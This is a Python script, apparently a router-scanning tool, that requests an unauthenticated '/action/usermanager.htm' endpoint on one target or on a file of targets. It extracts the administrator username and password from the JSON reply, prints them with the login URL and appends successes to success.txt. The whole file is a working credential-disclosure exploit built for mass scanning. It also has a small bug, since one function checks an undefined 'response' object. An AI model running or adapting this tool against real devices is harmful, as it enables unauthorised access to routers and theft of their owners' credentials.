from optparse import OptionParser
import requests
import json
# import time
# import eventlet

def banner():
    print("""
  _____             _                                                     
 |  __ \           | |                                                    
 | |__) |___  _   _| |_ ___ _ __   ___  ___ __ _ _ __                     
 |  _  // _ \| | | | __/ _ \ '__| / __|/ __/ _` | '_ \                    
 | | \ \ (_) | |_| | ||  __/ |    \__ \ (_| (_| | | | |                   
 |_|  \_\___/ \__,_|\__\___|_|   _|___/\___\__,_|_| |_|                   
                                | |         | |                           
                          ______| |__  _   _| |_   _ _______  _ __   __ _ 
                         |______| '_ \| | | | | | | |_  / _ \| '_ \ / _` |
                                | |_) | |_| | | |_| |/ / (_) | | | | (_| |
                                |_.__/ \__, |_|\__,_/___\___/|_| |_|\__, |
                                        __/ |                        __/ |
                                       |___/                        |___/                                                                                                      
    	""")
        
def getpass(target):
    try:
        r = requests.get( target + '/action/usermanager.htm',timeout=2)
        #return r.text
        # print('===========')
        # print(r.text)
        # print('===========')
    except requests.exceptions.Timeout:
        print('[-]'+target+'请求超时')
    else:
        if response.status_code == 200:
            s=json.loads(r.text)
            if 'rows' in s:
                s=str(s['rows'])
                s=s.replace("[","")
                s=s.replace("]","")
                s=s.replace("\'","\"")
                s2=json.loads(s)
                print('[+]'+"账号:"+s2['user']+"，密码:"+s2['pwd']+"\n登录地址为:"+target+"/login.html")
            else:
                print('[-]'+target+"不存在该漏洞")
        else:
            print('[-]'+target+'请求被拒绝')
def getpass1(target):
    try:
        r = requests.get( target + '/action/usermanager.htm',timeout=2)
        #return r.text
        # print('===========')
        # print(r.text)
        # print('===========')
    except requests.exceptions.Timeout:
        print('[-]'+target+'请求超时')
    else:
        if r.status_code == 200:
            s=json.loads(r.text)
            if 'rows' in s:
                s=str(s['rows'])
                s=s.replace("[","")
                s=s.replace("]","")
                s=s.replace("\'","\"")
                s2=json.loads(s)
                sur=('[+]'+"账号:"+s2['user']+"，密码:"+s2['pwd']+"\n登录地址为:"+target+"/login.html")
                print(sur)
                with open('success.txt',mode="a",encoding="utf-8") as f:
                    f.write(sur+'\n')
            else:
                print('[-]'+target+"不存在该漏洞")
        else:
            print('[-]'+target+'请求被拒绝')
    

def main():
    usage = "example: python3 %prog -t 目标(格式：http://112.53.152.210:888)"
    parser = OptionParser(usage=usage)
    parser.add_option('-t', dest='target',type='string',help='目标ip')
    parser.add_option('-r', dest='file1',type='string',help='目标ip合并文本文档')
    (options, args) = parser.parse_args()
   
    target = options.target
    file1 = options.file1
    if target:
        getpass(target)
    if file1:
        with open(file1,mode='rt',encoding='utf-8') as f:
            for line in f.readlines():
                line = line.rstrip()
                getpass1(line)
                
        
if __name__ == "__main__":
    banner()
    main()
